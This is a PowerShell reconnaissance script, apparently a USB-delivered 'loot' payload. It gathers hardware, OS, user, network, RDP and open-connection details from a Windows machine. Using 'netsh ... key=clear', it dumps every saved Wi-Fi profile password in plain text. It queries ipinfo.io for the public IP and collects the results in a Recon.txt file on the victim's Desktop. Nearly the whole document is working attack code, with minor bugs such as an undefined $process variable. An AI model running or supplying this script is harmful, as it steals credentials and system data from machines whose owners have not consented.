############################################################################################################################################################

# Get nearby wifi networks

try
{
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
}
catch
{
$NearbyWifi="No nearby wifi networks detected"
}

############################################################################################################################################################

# Get IP / Network Info
try
{
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
}
catch
{
$computerPubIP="Error getting Public IP"
}

$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}

############################################################################################################################################################

$IsDHCPEnabled = $false
$Networks =  Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | ? {$_.IPEnabled}
foreach ($Network in $Networks) {
If($network.DHCPEnabled) {
$IsDHCPEnabled = $true
  }
$MAC = ipconfig /all | Select-String -Pattern "physical" | select-object -First 1; $MAC = [string]$MAC; $MAC = $MAC.Substring($MAC.Length - 17)
}

############################################################################################################################################################

#Get System Info
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerBIOS = Get-CimInstance CIM_BIOSElement

$computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List

$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table

############################################################################################################################################################

# Get HDDs
$driveType = @{
   2="Removable disk "
   3="Fixed local disk "
   4="Network disk "
   5="Compact disk "}
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }

#Get - Com & Serial Devices
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table

# Check RDP
$RDP
if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
	$RDP = "RDP is Enabled" 
} else {
	$RDP = "RDP is NOT enabled" 
}

############################################################################################################################################################

# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

# Get wifi SSIDs and Passwords	
$WLANProfileNames =@()
#Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
#Trim the output to receive only the name
Foreach($WLANProfileName in $Output){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()
#Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames){
    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }
    #Build the object and add this to an array
    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
}

############################################################################################################################################################

# local-user
$luser=Get-LocalUser

# Get Listeners / ActiveTcpConnections
$listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
$listener = $listener | foreach-object {
    $listenerItem = $_
    $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
    new-object PSObject -property @{
      "LocalAddress" = $listenerItem.LocalAddress
      "RemoteAddress" = $listenerItem.RemoteAddress
      "State" = $listenerItem.State
      "AppliedSetting" = $listenerItem.AppliedSetting
      "OwningProcess" = $listenerItem.OwningProcess
      "ProcessName" = $processItem.ProcessName
    }
} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table 

# process last
$process = $process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine

# installed software (get uninstaller)
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize

# drivers
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion

# videocard
$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution

############################################################################################################################################################

# MAKE LOOT FOLDER 

$FileName = "$env:HOMEPATH\Desktop\Recon.txt"

############################################################################################################################################################

# OUTPUTS RESULTS TO LOOT FILE

Clear-Host
Write-Host 

echo "==================================================================" >> $FileName
echo "Nearby Wifi:" >> $FileName
echo "==================================================================" >> $FileName
echo $NearbyWifi >> $FileName
echo "" >> $FileName
$computerSystem.Name >> $FileName
"==================================================================
Manufacturer: " + $computerSystem.Manufacturer >> $FileName
"Model: " + $computerSystem.Model >> $FileName
"Serial Number: " + $computerBIOS.SerialNumber >> $FileName
"" >> $FileName
"" >> $FileName
"" >> $FileName

"OS:
=================================================================="+ ($computerOs |out-string) >> $FileName

"CPU:
=================================================================="+ ($computerCpu| out-string) >> $FileName

"RAM:
==================================================================
Capacity: " + $computerRamCapacity+ ($computerRam| out-string) >> $env:TMP\$FileName

"Mainboard:
=================================================================="+ ($computerMainboard| out-string) >> $FileName

"Bios:
=================================================================="+ (Get-WmiObject win32_bios| out-string) >> $FileName


"Local-Users:
=================================================================="+ ($luser| out-string) >> $FileName

"HDDs:
=================================================================="+ ($Hdds| out-string) >> $FileName

"COM & SERIAL DEVICES:
==================================================================" + ($COMDevices | Out-String) >> $FileName

"Network: 
==================================================================
Computers MAC address: " + $MAC >> $FileName
"Computers IP address: " + $computerIP.ipaddress[0] >> $FileName
"Public IP address: " + $computerPubIP >> $FileName
"RDP: " + $RDP >> $FileName
"" >> $FileName
($Network| out-string) >> $FileName

"W-Lan profiles: 
=================================================================="+ ($WLANProfileObjects| Out-String) >> $FileName

"listeners / ActiveTcpConnections
=================================================================="+ ($listener| Out-String) >> $FileName


############################################################################################################################################################

# Remove Variables

Remove-Variable -Name computerPubIP,
computerIP,IsDHCPEnabled,Network,Networks, 
computerMAC,computerSystem,computerBIOS,computerOs,
computerCpu, computerMainboard,computerRamCapacity,
computerRam,driveType,Hdds,RDP,WLANProfileNames,WLANProfileName,
Output,WLANProfileObjects,WLANProfilePassword,WLANProfileObject,luser,
process,listener,listenerItem,software,drivers,videocard,
vault -ErrorAction SilentlyContinue -Force

